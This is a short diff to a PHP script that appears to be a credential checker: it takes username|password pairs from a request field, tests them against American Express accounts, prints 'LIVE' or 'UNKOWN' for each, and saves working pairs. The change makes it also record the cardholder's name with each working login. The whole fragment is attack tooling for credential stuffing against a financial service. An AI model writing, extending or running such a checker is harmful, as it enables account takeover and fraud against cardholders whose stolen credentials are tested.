@@ -69,7 +69,7 @@ if (!isset($_REQUEST['empas']))
 
       echo $current . ' ' . $username . '|' . $password . ' - ' . $postAmex->cardMemberName . ' - LIVE ' . PHP_EOL;
 
-      save('live', $username . '|' . $password);
+      save('live', $username . '|' . $password . ' - ' . $postAmex->cardMemberName);
     } else {
 
       echo $current . ' ' . $username . '|' . $password . ' - UNKOWN ' . PHP_EOL;
